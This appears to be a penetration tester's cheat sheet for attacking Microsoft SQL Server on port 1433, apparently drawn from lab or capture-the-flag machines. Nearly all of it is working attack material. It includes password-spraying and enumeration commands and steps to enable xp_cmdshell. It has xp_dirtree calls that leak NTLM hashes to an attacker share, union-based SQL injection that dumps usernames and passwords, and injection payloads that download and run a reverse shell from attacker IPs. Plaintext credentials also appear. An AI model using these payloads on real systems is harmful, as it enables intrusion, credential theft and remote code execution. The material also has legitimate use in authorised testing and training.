# MSSQL Port 1433

##### Enumeration

TEST DEFAULT CREDENTIALS.

````
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 $ip
````

#### PowerUpSQL

```bash
Import-Module .\PowerUpSQL.ps1
Get-SQLInstanceDomain
Invoke-SQLDumpInfo -Username flight\c.bum -password Tikkycoll_431012284 -Verbose
Get-SQLInstanceLocal -Username flight\c.bum -password Tikkycoll_431012284 -Verbose
Invoke-SQLAudit -Verbose -Instance SQLServer1
Invoke-SQLAudit -Username flight\c.bum -password Tikkycoll_431012284 -Verbose
sqlcmd.exe -S nagoya.nagoya-industries.com -U administrator -Q "EXEC sp_configure 'Show Advanced Options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
Get-SQLInstanceDomain -Verbose -DomainAccount svc_mssql
sqlcmd.exe -Q "use master; exec xp_dirtree '\\192.168.45.221\share\test'" -S nagoya.nagoya-industries.com`
```

##### Impacket

````
impacket-mssqlclient $user:$pass@$ip -windows-auth
````

##### Invoke-RunAs

If you have credentials for another user on a system, but cannot seem to login as them through any of the traditional methods, use the "Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "<reverse shell code>"" and execute a reverse shell to get onto the system as them.

##### Crackmapexec

````
proxychains crackmapexec mssql -d example.com -u sql_service -p password123  -x "whoami" 10.10.126.148
proxychains crackmapexec mssql -d example.com -u sql_service -p password123  -x "whoami" 10.10.126.148 -q 'SELECT name FROM master.dbo.sysdatabases;'
````

##### NetExec

Do not trust nxc's mssql  thing. try it manually, "impacket-mssqlclient administrator:hghgib6vHT3bVWf@10.10.112.154 -windows-auth"

````
nxc mssql $ip -u users.txt -p passwords.txt --continue-on-success
nxc mssql $ip -u users.txt -H $HASH --continue-on-success
````

##### Logging in

````
sqsh -S $ip -U sa -P CrimsonQuiltScalp193 #linux
proxychains sqsh -S 10.10.126.148 -U example.com\\sql_service -P password123 -D msdb #windows
````

##### Expliotation

```bash
xp_cmdshell whoami
enable_xp_cmdshell

# set up smb share locally to grab hash
xp_dirtree \\192.168.45.221\share\file
```

````
EXEC SP_CONFIGURE 'show advanced options', 1
reconfigure
go
EXEC SP_CONFIGURE 'xp_cmdshell' , 1
reconfigure
go
xp_cmdshell 'whoami'
go
xp_cmdshell 'powershell "Invoke-WebRequest -Uri http://10.10.126.147:7781/rshell.exe -OutFile c:\Users\Public\reverse.exe"'
go
xp_cmdshell 'c:\Windows\Tasks\pwn.exe'
go
````

Revshell Command that worked:

```bash
admin' UNION SELECT 1,2; EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://192.168.45.163:8000/rev.ps1") | powershell -noprofile';--+
```

#### Possible Queries

Test for xp_cmdshell first. A great guide is pentestmonkey's mssql cheatsheet.

Test for stacked queries, which is unique to MSSQL. Open up share on machine, or nc on 445.

```bash
q=500'; exec xp_dirtree '\\10.10.14.8\share\file';-- - # Used 500' bc union returned on this
```

Test for xp_cmdshell.

```bash
q=500'; exec xp_cmdshell 'ping 10.10.14.8';-- - # Run sudo tcpdump -i tun0 icmp
q=500'; exec sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; exec xp_cmdshell 'ping 10.10.14.8';-- -
q=500' UNION SELECT 1,2,3,4,5,6; EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.8:8000/rev.ps1") | powershell -noprofile';--+
q=500' UNION SELECT 1,2,3,4,5,6; exec sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.8:8000/rev.ps1") | powershell -noprofile';--+
```

For this, test for SQLi by doing something like '500%-- -' and checking response. Pick a field in response that only is returned for a valid search, and see when it's not returned.

```bash
select * from movies where name like '%500%';
q=500%'-- -
q=%500'-- -
q=500%' union select 1,2,3-- - # Until that field is returned
q=500' union select 1,2,3,4,5,6-- - # Same, RETURNED
q=500' union select 1,7337,9001,4,5,6-- -
q=500' union select 1,7337,9001,4,5,6-- -
q=500' union select 1,@@version,9001,4,5,6-- -
q=500' union select 1,user,9001,4,5,6-- -
q=500' union select 1,db_name(0),9001,4,5,6-- - # Run through integers to enum dbs
q=500' union select 1,name,3,4,5,6 from streamio..sysobjects where xtype='u'-- - # db is streamio
q=500' union select 1,CONCAT(name,':',id),3,4,5,6 from streamio..sysobjects where xtype='u'-- -
q=500' union select 1,string_agg(CONCAT(name,':',id),'|'),3,4,5,6 from streamio..sysobjects where xtype='u'-- - # Putting on a single row
q=500' union select 1,string_agg(CONCAT(name,':',id),'|'),3,4,5,6 from streamio..syscolumns where id=901578250-- - # 901.. is the users table that was returned from id
q=500' union select 1,string_agg(name,'|'),3,4,5,6 from streamio..syscolumns where id=901578250-- - # Don't need the id anymore, the last two have returned the columns, such as password, username, but not the data itself
q=500' union select 1,string_agg(concat(username,':',password),'|'),3,4,5,6 from users-- -
q=500' union select 1,string_agg(concat(username,':',password),'|'),3,4,5,6 from streamio..users-- -
```

```bash
select * from movies where CONTAINS (name, '*500*');
```

#### Enumeration

```bash
SELECT name FROM sys.databases;
SELECT * FROM master.INFORMATION_SCHEMA.TABLES;
```
##### Notes

If you're chiseling to look at mssql through the website on your localhost, go to phpmyadmin directory on the website

#### On Windows

If it has MSSQL installed. If not, you could always use Chisel.

```bash
sqlcmd -U db_admin -P 'B1@hx31234567890' -Q "USE STREAMIO_BACKUP; select username,password from users;"
```

```bash
sqlcmd -?
sqlcmd -Q "select name from sys.databases"
sqlcmd -Q "select * from sys.databases"
sqlcmd -Q "select name from sys.databases"
sqlcmd -Q "use umbraco; select * from umbraco..sysobjects"
sqlcmd -Q "use ADSync; exec xp_dirtree '\\10.10.14.8\share\file'"
sqlcmd -Q "use ADSync; select name from PK_mms_management_agent"
```

```bash
. .\PowerUpSQL.ps1
Invoke-SQLAudit -Verbose
```

If AD Azure, check out "https://blog.xpnsec.com/azuread-connect-for-redteam/".

sqlcmd -U sa -P DeathMarchPac1942 -Q "use umbraco; exec xp_cmdshell 'whoami'"
sqlcmd -U sa -P DeathMarchPac1942 -Q "use umbraco; EXEC SP_CONFIGURE 'xp_cmdshell' , 1; exec xp_cmdshell 'c:\Windows\Tasks\shell80.exe'"
sqlcmd -U sa -P DeathMarchPac1942 -Q "use umbraco; exec xp_dirtree '\\192.168.45.221\share\file'"
sqlcmd -U sa -P DeathMarchPac1942 -Q "use umbraco; select * from umbraco..cmsMember"
sqlcmd -U sa -P DeathMarchPac1942 -Q "use umbraco; select * from umbraco..sysobjects"umbracoUserLogin umbracoUser umbracoUserGroup

.\sqlcmd.exe -Q "exec xp_cmdshell 'whoami'"
.\sqlcmd -Q "use master; EXEC SP_CONFIGURE 'xp_cmdshell' , 1; exec xp_cmdshell 'whoami'"
sqlcmd -Q "use msdb; exec xp_cmdshell 'whoami'"
sqlcmd.exe -Q "use msdb; EXEC SP_CONFIGURE 'xp_cmdshell' , 1; exec xp_cmdshell 'C:\Users\Christopher.Lewis\Documents\shell139.exe'"